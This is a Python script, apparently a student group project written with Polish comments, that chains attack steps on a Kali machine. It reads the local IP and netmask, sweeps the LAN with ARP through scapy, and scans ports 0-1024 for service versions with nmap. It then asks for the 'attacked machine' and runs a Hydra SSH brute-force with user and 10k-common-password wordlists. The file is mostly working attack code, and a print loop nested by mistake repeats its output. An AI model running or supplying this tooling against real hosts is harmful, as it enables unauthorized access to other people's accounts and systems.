#Projekt1 SDA - Grupa 2 " Jacek, Dawid, Jakub, Janek"

import subprocess
import os

from nmap import nmap


#Funkcja pozwalająca znaleźć własny adres IP oraz maske podsieci.
#Korzysta z subprocess który umożliwia wykonywanie komend w terminalu

def ip_and_netmask():
    output = subprocess.run(["ifconfig"], stdout=subprocess.PIPE).stdout.decode("utf-8")
    lines = output.split("\n")
    for line in lines:
        if "inet" in line and "netmask" in line:
            parts = line.split()
            if parts[1] != "127.0.0.1":
                ip_address = parts[1].split("/")[0]
                netmask = parts[3]
                return (ip_address, netmask)
    return ("Nie znaleziono zadnego adresu")

ip_address, netmask = ip_and_netmask()
print(f"Twoj adres IP to: {ip_address}")
print(f"Twoja maska to: {netmask}")

#urchomienie skaner LAN wraz z MAc adresem.
from scapy.all import ARP, Ether, srp
ip_address = input("Podaj adres np(192.168.8.0/24) z maska podsieci: ")
target_ip = ip_address
# Ip w sieci lan skrypt
#Tworzenie pakietu ARP (musi zostac zainstalowany przez terminal "pip install arp"
arp = ARP(pdst=target_ip)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether/arp
result = srp(packet, timeout=3)[0]
clients = []
for sent, received in result:
  clients.append({'ip': received.psrc, 'mac': received.hwsrc})
  print("Aktywne IP:")
  print("IP" + " " * 18 + "MAC")
  for client in clients:
   print('{:16} {}'.format(client['ip'], client['mac']))
# Wcześniej zaimportowany moduł Nmap umożliwia przeskanowanie sieci.
# Podaje informacje o otwrtych portach oraz wersjach oprogramowania

import nmap
nm = nmap.PortScanner()

# ustalanie adresu oraz zakresu portow
target = input("Podaj konkretny adres IP lub zakres w postaci xxx.xxx.xxx.xxx/xx ktory chcesz przeskanowac w poszukiwaniu otwartych portow: ")
port_range = "0-1024"

# Wykonywanie skanu
nm.scan(target, port_range, '-sV')

# Petla przechodząca przez porty, następnie drukuje przeskanowane porty 
for host in nm.all_hosts():
    for proto in nm[host].all_protocols():
        lport = nm[host][proto].keys()
        for port in lport:
            print(f"{host}:{port}/{proto} {nm[host][proto][port]['product']} {nm[host][proto][port]['version']} ")

# Metoda prosi użytkownika o podanie IP
host = input("podaj adres ip atakowanej maszyny: ")
#plik z nazwami uzytkownikow
username_file = "/home/kali/Desktop/users1.txt"

# Plik z haslami
password_file = "/home/kali/Desktop/10k-most-common1.txt"

#wykonanie ataku bruteforce na ssh w hydrze
os.system(f"hydra -f -L {username_file} -P {password_file} {host} ssh")
